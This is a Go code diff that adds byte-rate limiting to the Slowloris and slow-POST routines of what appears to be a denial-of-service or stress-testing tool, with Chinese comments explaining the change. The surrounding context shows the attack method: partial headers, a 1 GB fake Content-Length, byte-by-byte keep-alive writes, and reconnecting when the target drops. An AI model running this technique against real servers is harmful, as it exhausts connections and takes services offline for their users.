@@ -108,6 +108,14 @@ func StartSlowlorisEx(cfg AttackConfig) *AttackSession {
 									header += "Content-Type: application/x-www-form-urlencoded\r\nContent-Length: 1073741824\r\n\r\n"
 								}
 								conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
+								// 限速：慢速攻击此前完全没有限速检查，速率配置对它无效。
+								// 字节维度按真实发送字节计（header + post 的 1B body）。
+								if !s.checkRate(len(header) + 1) {
+									conn.Close()
+									conn = nil
+									time.Sleep(200 * time.Millisecond)
+									continue
+								}
 								if _, err := conn.Write([]byte(header)); err != nil {
 									conn.Close()
 									conn = nil
@@ -141,6 +149,12 @@ func StartSlowlorisEx(cfg AttackConfig) *AttackSession {
 								keep = []byte("a") // slow POST：逐字节挤 body
 							} else {
 								keep = []byte("X-a: " + randomAlpha(rng, 6) + "\r\n") // slowloris：追加 header
+							}
+							// 限速：保活写入同样计入字节预算；被拒则跳过本次保活
+							// （连接可能因 idle 被目标回收，下轮重建即可）。
+							if !s.checkRate(len(keep)) {
+								tc.refresh()
+								continue
 							}
 							if _, err := conn.Write(keep); err != nil {
 								// 目标断开（超时/防护）：重建连接继续占坑
